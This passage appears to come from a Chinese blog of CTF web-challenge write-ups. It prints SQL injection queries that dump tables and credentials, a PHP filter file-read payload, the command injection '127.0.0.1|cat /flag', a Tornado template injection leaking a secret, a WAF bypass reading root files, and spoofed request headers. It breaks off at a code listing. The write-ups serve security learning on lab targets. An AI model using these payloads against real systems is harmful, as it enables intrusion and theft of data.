</span></span></code></pre></td></tr></table></div></div><hr><h1 id=suctf-2019easysql class=headerLink><a href=#suctf-2019easysql class=header-mark></a>[SUCTF 2019]EasySQL</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120102317.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120102317.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120102317.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120102317.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120102317.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120102317.png></p><p>单引号无报错，尝试堆叠注入可以回显。</p><p>和 [强网杯 2019]随便注这道题一样查库查表查字段</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1;show databases;
</span></span><span class=line><span class=cl>1;show tables;
</span></span></code></pre></td></tr></table></div></div><p>但是执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=mi>1</span><span class=p>;</span><span class=k>desc</span><span class=w> </span><span class=o>`</span><span class=n>Flag</span><span class=o>`</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=p>;</span><span class=k>show</span><span class=w> </span><span class=n>columns</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>Flag</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>返回了"Nonono.“测试出被过滤了：desc、from、Flag。</p><p>接下来的都是抄网上的预期解也是第一次见。</p><p>比赛时源码泄露</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select $_GET[&#39;query&#39;] || flag from flag
</span></span></code></pre></td></tr></table></div></div><blockquote><p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode
模式：pipes_as_concat 来实现oracle 的一些功能</p></blockquote><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1;set sql_mode=PIPES_AS_CONCAT;select 1
</span></span></code></pre></td></tr></table></div></div><p>非预期解</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>*,1 
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=actf2020-新生赛include class=headerLink><a href=#actf2020-%e6%96%b0%e7%94%9f%e8%b5%9binclude class=header-mark></a>[ACTF2020 新生赛]Include</h1><p>不截图了，进入靶机只有一个<strong>tips</strong>等着被点。跳转以后看url中参数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?file=flag.php
</span></span></code></pre></td></tr></table></div></div><p>页面内容只有</p><blockquote><p>Can you find out the flag?</p></blockquote><p>立马想到使用php伪协议读文件内容。使用filter过滤器</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?file=php://filter/convert.base64-encode/resource=flag.php
</span></span></code></pre></td></tr></table></div></div><p>得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo=
</span></span></code></pre></td></tr></table></div></div><p>解密得到flag</p><hr><h1 id=极客大挑战-2019secret-file class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019secret-file class=header-mark></a>[极客大挑战 2019]Secret File</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103724.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103724.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103724.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103724.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103724.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103724.png></p><p>查看源码，又一个背景是黑色的超链接跳转到 Archive_room.php。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103842.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103842.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103842.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103842.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103842.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103842.png></p><p>查看源码SECRET跳转的是action.php。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103907.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103907.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103907.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103907.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103907.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103907.png></p><p>但是跳转以后是url地址为end.php，所以中间跳过了一个页面，使用bp抓包查看。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104246.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104246.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104246.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104246.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104246.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104246.png></p><p>stristr()函数返回字符串中子串第一次出现位置之后的内容，简而言之还是过滤。</p><p>同样使用php伪协议filter过滤器读取文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?file=php://filter/convert.base64-encode/resource=flag.php
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
</span></span></code></pre></td></tr></table></div></div><p>解密得到网页源码，flag在其中。</p><hr><h1 id=极客大挑战-2019lovesql class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019lovesql class=header-mark></a>[极客大挑战 2019]LoveSQL</h1><p>顶端の告诫：用 sqlmap 是没有灵魂的</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104703.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104703.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104703.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104703.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104703.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104703.png></p><p>尝试万能密码（其实没卵用）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;or 1=1 #
</span></span><span class=line><span class=cl>任意密码
</span></span></code></pre></td></tr></table></div></div><p>这道题是常规的sql注入，测注入点、查字段数、爆库、爆字段值、爆表。组合拳</p><p>字段数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; order by 3 #
</span></span></code></pre></td></tr></table></div></div><p>爆库：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>geekuser,l0ve1ysq1
</span></span></code></pre></td></tr></table></div></div><p>爆字段值：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;l0ve1ysq1&#39; #
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>id,username,password
</span></span></code></pre></td></tr></table></div></div><p>爆表：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&#39;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{c4e8849c-e0e3-4e0d-b701-26a5abeec46a}&#39;
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=20210121 class=headerLink><a href=#20210121 class=header-mark></a>2021.01.21</h1><h1 id=gxyctf2019ping-ping-ping class=headerLink><a href=#gxyctf2019ping-ping-ping class=header-mark></a>[GXYCTF2019]Ping Ping Ping</h1><p><a href=https://braindance.tk/2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/ target=_blank rel="noopener noreffer">传送门</a></p><hr><h1 id=actf2020-新生赛exec class=headerLink><a href=#actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bexec class=header-mark></a>[ACTF2020 新生赛]Exec</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121090002.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121090002.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121090002.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121090002.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121090002.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121090002.png></p><p>肯定是尝试管道符</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>127.0.0.1|cat /flag
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=护网杯-2018easy_tornado class=headerLink><a href=#%e6%8a%a4%e7%bd%91%e6%9d%af-2018easy_tornado class=header-mark></a>[护网杯 2018]easy_tornado</h1><p>打开页面三个超链接</p><blockquote><p>/flag.txt</p><p>/welcome.txt</p><p>hints.txt</p></blockquote><p>内容分别是</p><blockquote><p>flag in /fllllllllllllag</p><p>render</p><p>md5(cookie_secret+md5(filename))</p></blockquote><p>进入hints.txt注意到url地址此时为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/file?filename=/hints.txt&amp;filehash=2a84a09bc1d5e3d8745131754ff208fa
</span></span></code></pre></td></tr></table></div></div><p>再根据hints.txt文件的内容，推断可以使用url方式访问文件，但是需要提供<strong>filehash</strong>值，加密的方法即hints.txt的内容：md5(cookie_secret+md5(filename))。flag文件的名称<code>filename</code>有了，接下来就是获取<code>cookie_secret</code>的值。</p><p>接下来触及到盲区了，获取cookie_secret是看wp。</p><blockquote><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p></blockquote><blockquote><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p></blockquote><p>获取cookie_secret的payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/error?msg={{handler.settings}}
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121091616.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121091616.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121091616.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121091616.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121091616.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121091616.png></p><p>获得cookie_secret的值为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>eb326d39-cd67-47bd-b2d3-71125996417b
</span></span></code></pre></td></tr></table></div></div><p>根据hints.txt的url验证一下是如何加密的。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092122.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092122.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092122.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092122.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092122.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092122.png></p><p>选中的蓝色部分是<code>/hints.txt</code>加密后的md5值。推断出filehash格式以后直接访问flag文件，payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/file?filename=/hints.txt&amp;filehash=2a84a09bc1d5e3d8745131754ff208fa
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=极客大挑战-2019knife class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019knife class=header-mark></a>[极客大挑战 2019]Knife</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092431.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092431.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092431.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092431.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092431.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092431.png></p><p>一句话直接连。</p><hr><h1 id=roarctf-2019easy-calc class=headerLink><a href=#roarctf-2019easy-calc class=header-mark></a>[RoarCTF 2019]Easy Calc</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092956.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092956.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092956.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092956.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092956.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092956.png></p><p>一个计算器随便试一试，当输入字母时会报错。查看网页源码，在script中发现了运行计算器的php文件：<strong>calc.php</strong>，但是也有一句很重要的注释</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!--I&#39;ve set up WAF to ensure security.--&gt;
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121093233.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121093233.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121093233.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121093233.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121093233.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121093233.png></p><p>php的正则表达式中并没有过滤字母的条件，所以我们输入字母被过滤是因为<strong>WAF</strong>，接下来是参考网上的wp自己的理解</p><p>可以在calc.php传参</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>? num=a
</span></span></code></pre></td></tr></table></div></div><p>php会输出一个值a，说明已经绕过了WAF。这里使用的是WAF和php解析方法不一样，WAF解析到空格&rsquo; &lsquo;会直接过滤掉，这样WAF认为传入的就是一个空值，并不会识别num，但是php解析的时候会把空格去掉，这样就能get到num的值。</p><p>接下来绕过正则就可以使用char()的方式使用ascii码转。空格被过滤但是想使用php输出可以使用var_dump()</p><p>查看根目录下文件，可以使用scandir（）遍历文件夹，其中char（47）&mdash;&mdash;> &lsquo;/&rsquo; ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>? num=1;var_dump(scandir(chr(47)))
</span></span></code></pre></td></tr></table></div></div><p>找到了疑似flag文件：f1agg，使用file_get_contents（）读取文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=极客大挑战-2019http class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019http class=header-mark></a>[极客大挑战 2019]Http</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png></p><p>查看源码在"氛围"这两个字上有隐藏的跳转Secret.php。进入以后页面显示</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;
</span></span></code></pre></td></tr></table></div></div><p>提示页面不是来自这个网址，所以在HackBar上加上Referer。之后又提示</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Please use &#34;Syclover&#34; browser
</span></span></code></pre></td></tr></table></div></div><p>加上User-Agent。提示</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>No!!! you can only read this locally!!!
</span></span></code></pre></td></tr></table></div></div><p>加上X-Forwarded-For。<a href=https://www.runoob.com/w3cnote/http-x-forwarded-for.html target=_blank rel="noopener noreffer">HTTP X-Forwarded-For 介绍</a></p><p>最终的请求头：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /Secret.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: node3.buuoj.cn:26715
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Syclover
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
</span></span><span class=line><span class=cl>x-forwarded-for: 127.0.0.1
</span></span><span class=line><span class=cl>referer: https://www.Sycsecret.com
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=极客大挑战-2019php class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019php class=header-mark></a>[极客大挑战 2019]PHP</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121105104.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121105104.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121105104.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121105104.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121105104.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121105104.png></p><p>源码备份在<code>www.zip</code>中。下载以后有五个文件</p><blockquote><p>class.php</p><p>flag.php</p><p>index.js</p><p>index.php</p><p>style.css</p></blockquote><p>在index.php中有一段代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>    include &#39;class.php&#39;;
</span></span><span class=line><span class=cl>    $select = $_GET[&#39;select&#39;];
</span></span><span class=line><span class=cl>    $res=unserialize(@$select);
</span></span><span class=line><span class=cl>    ?&gt;
</span></span></code></pre></td></tr></table></div></div><p>再结合又一个class.php，所以这道题考点应该是反序列化。</p><p>class.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
